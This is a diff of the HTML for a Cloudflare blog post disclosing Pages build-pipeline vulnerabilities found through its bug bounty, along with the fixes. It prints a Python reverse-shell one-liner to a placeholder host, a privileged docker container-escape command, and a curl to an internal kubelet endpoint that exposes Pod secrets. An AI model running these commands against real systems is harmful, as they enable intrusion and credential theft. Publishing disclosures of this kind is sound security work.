@@ -1,68 +1,78 @@
-<div class="mb2 gray5">8 min read</div>
+<div class="mb2 gray5">7 min read</div>
 <div class="post-content lh-copy gray1">
-	<figure class="kg-card kg-image-card"><img src="https://blog.cloudflare.com/content/images/2022/05/image6-3.png" class="kg-image" alt="The Cloudflare Bug Bounty program and Cloudflare Pages" loading="lazy"></figure>
-	<p><em>The Cloudflare Pages team recently collaborated closely with security researchers at </em><a href="https://assetnote.io"><em>Assetnote</em></a><em> through our </em><a href="https://hackerone.com/cloudflare"><em>Public Bug Bounty</em></a><em>. Throughout the process we found and have fully patched vulnerabilities discovered in Cloudflare Pages. You can read their detailed </em><a href="https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1"><em>write-up here</em></a><em>. There is no outstanding risk to Pages customers. In this post we share information about the research that could help others make their infrastructure more secure, and also highlight our bug bounty program that helps to make our product more secure.</em></p>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/4DKsynePRbtLe90pZOXo28/8cb999bb14b55d5f4c9f8b1fd9bf7695/image6-3.png" alt="The Cloudflare Bug Bounty program and Cloudflare Pages" class="kg-image" width="1801" height="1013" loading="lazy">
+
+	</figure>
+	<p><i>The Cloudflare Pages team recently collaborated closely with security researchers at</i> <a href="https://assetnote.io"><i>Assetnote</i></a> <i>through our</i> <a href="https://hackerone.com/cloudflare"><i>Public Bug Bounty</i></a><i>. Throughout the process we found and have fully patched vulnerabilities discovered in Cloudflare Pages. You can read their detailed</i> <a href="https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1"><i>write-up here</i></a><i>. There is no outstanding risk to Pages customers. In this post we share information about the research that could help others make their infrastructure more secure, and also highlight our bug bounty program that helps to make our product more secure.</i></p>
 	<p>Cloudflare cares deeply about security and protecting our users and customers — in fact, it’s a big part of the reason we’re here. But how does this manifest in terms of how we run our business? There are a number of ways. One very important prong of this is our <a href="https://blog.cloudflare.com/cloudflare-bug-bounty-program">bug bounty program</a> that facilitates and rewards security researchers for their collaboration with us.</p>
 	<p>But we don’t just fix the security issues we learn about — in order to build trust with our customers and the community more broadly, we are transparent about incidents and bugs that we find.</p>
 	<p>Recently, we worked with a group of researchers on improving the security of Cloudflare Pages. This collaboration resulted in several security vulnerability discoveries that we quickly fixed. We have no evidence that malicious actors took advantage of the vulnerabilities found. Regardless, we notified the limited number of customers that might have been exposed.</p>
 	<p>In this post we are publicly sharing what we learned, and the steps we took to remediate what was identified. We are thankful for the collaboration with the researchers, and encourage others to <a href="https://hackerone.com/cloudflare">use the bounty program</a> to work with us to help us make our services — and by extension the Internet — more secure!</p>
-	<h2 id="what-happens-when-a-vulnerability-is-reported">What happens when a vulnerability is reported?</h2>
+	<h2>What happens when a vulnerability is reported?</h2>
 	<p>Once a vulnerability has been reported via HackerOne, it flows into our vulnerability management process:</p>
 	<ol>
-		<li>We investigate the issue to understand the criticality of the report.</li>
-		<li>We work with the engineering teams to scope, implement, and validate a fix to the problem. For urgent problems we start working with engineering immediately, and less urgent issues we track and prioritize alongside engineering’s normal bug fixing cadences.</li>
-		<li>Our Detection and Response team investigates high severity issues to see whether the issue was exploited previously.</li>
+		<li>
+			<p>We investigate the issue to understand the criticality of the report.</p>
+		</li>
+		<li>
+			<p>We work with the engineering teams to scope, implement, and validate a fix to the problem. For urgent problems we start working with engineering immediately, and less urgent issues we track and prioritize alongside engineering’s normal bug fixing cadences.</p>
+		</li>
+		<li>
+			<p>Our Detection and Response team investigates high severity issues to see whether the issue was exploited previously.</p>
+		</li>
 	</ol>
 	<p>This process is flexible enough that we can prioritize important fixes same-day, but we never lose track of lower criticality issues.</p>
-	<h2 id="what-was-discovered-in-cloudflare-pages">What was discovered in Cloudflare Pages?</h2>
+	<h2>What was discovered in Cloudflare Pages?</h2>
 	<p>The Pages team had to solve a pretty difficult problem for Cloudflare Builds (our CI/CD build pipeline): how can we run untrusted code safely in a multi-tenant environment? Like all complex engineering problems, getting this right has been an iterative process. In all cases, we were able to quickly and definitively address bugs reported by security researchers. However, as we continued to work through reports by the researchers, it became clear that our initial build architecture decisions provided too large an <a href="https://www.cloudflare.com/learning/security/what-is-an-attack-surface">attack surface</a>. The Pages team pivoted entirely and re-architected our platform in order to use gVisor and further isolate builds.</p>
-	<p>When determining impact, it is not enough to find no evidence that a bug was exploited, <em>we must conclusively prove that it was not exploited</em>. For almost all the bugs reported, we found definitive signals in audit logs and were able to correlate that data exclusively against activity by trusted security researchers.</p>
-	<p>However, for one bug, <em>while we found no evidence that the bug was exploited beyond the work of security researchers</em>, we were not able meaningfully prove that it was not. In the spirit of full transparency, we notified all Pages users that may have been impacted.</p>
+	<p>When determining impact, it is not enough to find no evidence that a bug was exploited, <i>we must conclusively prove that it was not exploited</i>. For almost all the bugs reported, we found definitive signals in audit logs and were able to correlate that data exclusively against activity by trusted security researchers.</p>
+	<p>However, for one bug, <i>while we found no evidence that the bug was exploited beyond the work of security researchers</i>, we were not able meaningfully prove that it was not. In the spirit of full transparency, we notified all Pages users that may have been impacted.</p>
 	<p>Now that all the issues have been remedied, and individual customers have been notified, we’d like to share more information about the issues.</p>
-	<h3 id="bug-1-command-injection-in-clone_repo">Bug 1: Command injection in CLONE_REPO</h3>
+	<h3>Bug 1: Command injection in CLONE_REPO</h3>
 	<p>With a flaw in our logic during build initialization, it was possible to execute arbitrary code, echo environment variables to a file and then read the contents of that file.</p>
-	<figure class="kg-card kg-image-card"><img src="https://blog.cloudflare.com/content/images/2022/05/image2-1.png" class="kg-image" alt="" loading="lazy"></figure>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/4xCsRLGOMLRsVRAAbQBjXM/9819dbcdfdfa12fc18a98aa8d855d036/image2-1.png" alt="" class="kg-image" width="1066" height="46" loading="lazy">
+
+	</figure>
 	<p>The crux of the bug was that <code>root_dir</code> in this line of code was attacker controlled. After gaining control the researcher was able to specially craft a malicious <code>root_dir</code> to dump the environment variables of the process to a file. Those environment variables contained our GitHub bot’s authorization key. This would have allowed the attacker to read the repositories of other Pages' customers, and many of those repositories are private.</p>
-	<figure class="kg-card kg-image-card"><img src="https://blog.cloudflare.com/content/images/2022/05/image1-6.png" class="kg-image" alt="Dumping the contents of the environment to a file
-" loading="lazy"></figure>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/61X1OXGLWGeBCkSmeQb8nj/ac07d42c01ae740990a6bc27566d6b3a/image1-6.png" alt="Dumping the contents of the environment to a file
+" class="kg-image" width="740" height="172" loading="lazy">
+
+	</figure>
 	<p>After fixing the input validation for this field to prevent the bug, and rolling the disclosed keys, we investigated all other paths that had ever been set by our Pages customers to see if this attack had ever been performed by any other (potentially malicious) security researchers. We had logs showing that this was the first this particular attack had ever been performed, and responsibly reported.</p>
-	<h3 id="bug-2-command-injection-in-publish_assets">Bug 2: Command injection in PUBLISH_ASSETS</h3>
+	<h3>Bug 2: Command injection in PUBLISH_ASSETS</h3>
 	<p>This bug is nearly identical to the first one, but on the publishing step instead of the clone step. We went to work rotating the secrets that were exposed, fixing the input validation issues, and rotating the exposed secrets. We investigated the Cloudflare audit logs to confirm that the sensitive credentials had not been used by anyone other than our build infrastructure, and within the scope of the security research being performed.</p>
-	<h3 id="bug-3-cloudflare-api-key-disclosure-in-the-asset-publishing-process">Bug 3: Cloudflare API key disclosure in the asset publishing process</h3>
+	<h3>Bug 3: Cloudflare API key disclosure in the asset publishing process</h3>
 	<p>While building customer pages, a program called /opt/pages/bin/pages-metadata-generator is involved. This program had the Linux permissions of 777, allowing all users on the machine to read the program, execute the program, but most importantly overwrite the program. If you can overwrite the program prior to its invocation, the program might run with higher permissions when the next user comes along and wants to use it.</p>
-	<p>In this case the attack is simple. When a Pages build runs, the following <code>build.sh</code> is specified to run, and it can overwrite the executable with a new one.</p><!--kg-card-begin: markdown-->
-	<pre><code>#!/bin/bash
-cp pages-metadata-generator /opt/pages/bin/pages-metadata-generator
-</code></pre>
-	<!--kg-card-end: markdown-->
-	<p>This allows the attacker to provide their own <code>pages-metadata-generator</code> program that is run with a populated set of environment variables. The proof of concept provided to Cloudflare was this minimal reverse shell.</p><!--kg-card-begin: markdown-->
-	<pre><code>#!/bin/bash
+	<p>In this case the attack is simple. When a Pages build runs, the following <code>build.sh</code> is specified to run, and it can overwrite the executable with a new one.</p>
+	<pre class="language-bash"><code class="language-bash">#!/bin/bash
+cp pages-metadata-generator /opt/pages/bin/pages-metadata-generator</code></pre>
+	<p>This allows the attacker to provide their own <code>pages-metadata-generator</code> program that is run with a populated set of environment variables. The proof of concept provided to Cloudflare was this minimal reverse shell.</p>
+	<pre class="language-bash"><code class="language-bash">#!/bin/bash
 echo "henlo fren"
 export &gt; /tmp/envvars
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x.x",9448));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
-</code></pre>
-	<!--kg-card-end: markdown-->
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x.x",9448));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</code></pre>
 	<p>With a reverse shell, the attackers only need to run `env` to see a list of environment variables that the program was invoked with. We fixed the file permissions of the process, rotated the credentials, and investigated in Cloudflare audit logs to confirm that the sensitive credentials had not been used by anyone other than our build infrastructure, and within the scope of the security research.</p>
-	<h3 id="bug-4-bash-path-injection">Bug 4: Bash path injection</h3>
+	<h3>Bug 4: Bash path injection</h3>
 	<p>This issue was very similar to Bug 3. The PATH environment variable contained a large set of directories for maximum compatibility with different developer tools.</p>
 	<p><code>PATH=/opt/buildhome/.swiftenv/bin:/opt/buildhome/.swiftenv/shims:/opt/buildhome/.php:/opt/buildhome/.binrc/bin:/usr/local/rvm/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/buildhome/.cask/bin:/opt/buildhome/.gimme/bin:/opt/buildhome/.dotnet/tools:/opt/buildhome/.dotnet</code></p>
 	<p>Unfortunately not all of these directories were set to the proper filesystem permissions allowing a malicious version of the program bash to be written to them, and later invoked by the Pages build process. We patched this bug, rotated the impacted credentials, and investigated in Cloudflare audit logs to confirm that the sensitive credentials had not been used by anyone other than our build infrastructure, and within the scope of the security research.</p>
-	<h3 id="bug-5-azure-pipelines-escape">Bug 5: Azure pipelines escape</h3>
-	<p>Back when this research was conducted we were running Cloudflare Pages on Azure Pipelines. Builds were taking place in highly privileged containers and the containers had the docker socket available to them. Once the researchers had root within these containers, escaping them was trivial after installing docker and mounting the root directory of the host machine.</p><!--kg-card-begin: markdown-->
-	<pre><code>sudo docker run -ti --privileged --net=host -v /:/host -v /dev:/dev -v /run:/run ubuntu:latest
-</code></pre>
-	<!--kg-card-end: markdown-->
+	<h3>Bug 5: Azure pipelines escape</h3>
+	<p>Back when this research was conducted we were running Cloudflare Pages on Azure Pipelines. Builds were taking place in highly privileged containers and the containers had the docker socket available to them. Once the researchers had root within these containers, escaping them was trivial after installing docker and mounting the root directory of the host machine.</p>
+	<pre class="language-bash"><code class="language-bash">sudo docker run -ti --privileged --net=host -v /:/host -v /dev:/dev -v /run:/run ubuntu:latest</code></pre>
 	<p>Once they had root on the host machine, they were able to recover Azure DevOps credentials from the host which gave access to the Azure Organization that Cloudflare Pages was running within.</p>
 	<p>The credentials that were recovered gave access to highly audited APIs where we could validate that this issue was not previously exploited outside this security research.</p>
-	<h3 id="bug-6-pages-on-kubernetes">Bug 6: Pages on Kubernetes</h3>
+	<h3>Bug 6: Pages on Kubernetes</h3>
 	<p>After receipt of the above bugs, &nbsp;we decided to change the architecture &nbsp;of Pages. One of these changes was migration of the product from Azure to Kubernetes, and simplifying the workflow, so the attack surface was smaller and defensive programming practices were easier to implement. After the change, Pages builds are within Kubernetes Pods and are seeded with the minimum set of credentials needed.</p>
-	<p>As part of this migration, we left off a very important iptables rule in our Kubernetes control plane, making it easy to <code>curl</code> the Kubernetes API and read secrets related to other Pods in the cluster (each Pod representing a separate Pages build).</p><!--kg-card-begin: markdown-->
-	<pre><code>curl -v -k [http://10.124.200.1:10255/pods](http://10.124.200.1:10255/pods)
-</code></pre>
-	<!--kg-card-end: markdown-->
+	<p>As part of this migration, we left off a very important iptables rule in our Kubernetes control plane, making it easy to <code>curl</code> the Kubernetes API and read secrets related to other Pods in the cluster (each Pod representing a separate Pages build).</p>
+	<pre class="language-bash"><code class="language-bash">curl -v -k [http://10.124.200.1:10255/pods](http://10.124.200.1:10255/pods)</code></pre>
 	<p>We quickly patched this issue with iptables rules to block network connections to the Kubernetes control plane. One of the secrets available to each Pod was the GitHub OAuth secret which would have allowed someone who exploited this issue to read the GitHub repositories of other Pages' customers.</p>
 	<p>In the previously reported issues we had robust logs that showed us that the attacks that were being performed had never been performed by anyone else. The logs related to inspecting Pods were not available to us, so we decided to notify all Cloudflare Pages customers that had ever had a build run on our Kubernetes-based infrastructure. After patching the issue and investigating which customers were impacted, we emailed impacted customers on February 3 to tell them that it’s possible someone other than the researcher had exploited this issue, because our logs couldn’t prove otherwise.</p>
-	<h2 id="takeaways">Takeaways</h2>
+	<h2>Takeaways</h2>
 	<p>We are thankful for all the security research performed on our Pages product, and done so at such an incredible depth. CI/CD and build infrastructure security problems are notoriously hard to prevent. A bug bounty that incentivizes researchers to keep coming back is invaluable, and we appreciate working with researchers who were flexible enough to perform great research, and work with us as we re-architected the product for more robustness. An in-depth write-up of these issues is available from the Assetnote team on <a href="https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1">their website</a>.</p>
 	<p>More than this, however, the work of all these researchers is one of the best ways to test the security architecture of any product. While it might seem counter-intuitive after a post listing out a number of bugs, all these diligent eyes on our products allow us to feel much more confident in the security architecture of Cloudflare Pages. We hope that our transparency, and our description of the work done on our security posture, enables you to feel more confident, too.</p>
 	<p>Finally: if you are a security researcher, we’d love to work with you to make our products more secure. Check out <a href="https://hackerone.com/cloudflare">hackerone.com/cloudflare</a> for more info!</p>
